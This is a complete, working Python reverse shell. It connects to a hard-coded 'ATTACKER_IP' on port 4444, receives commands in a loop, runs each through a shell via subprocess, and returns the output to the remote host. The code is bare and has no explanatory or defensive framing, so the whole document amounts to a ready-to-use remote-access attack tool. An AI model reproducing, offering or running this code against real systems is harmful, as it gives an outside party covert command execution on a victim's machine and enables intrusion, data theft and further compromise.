import socket
import subprocess

def connect_to_attacker(ip, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((ip, port))
        print("[+] Connected to attacker")

        while True:
            command = client_socket.recv(4096).decode()  # Receive command from attacker
            if not command.strip():
                continue  # Skip empty commands
            
            print(f"[DEBUG] Received command: {command}")

            if command.lower() == "exit":
                print("[+] Exiting...")
                break

            # Execute the command
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            response = output.stdout + output.stderr

            # Send response back to attacker
            client_socket.send(response.encode())
    except KeyboardInterrupt:
        print("\n[-] Reverse shell terminated by user.")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    ATTACKER_IP = "172.19.19.167"
    ATTACKER_PORT = 4444          
    connect_to_attacker(ATTACKER_IP, ATTACKER_PORT)
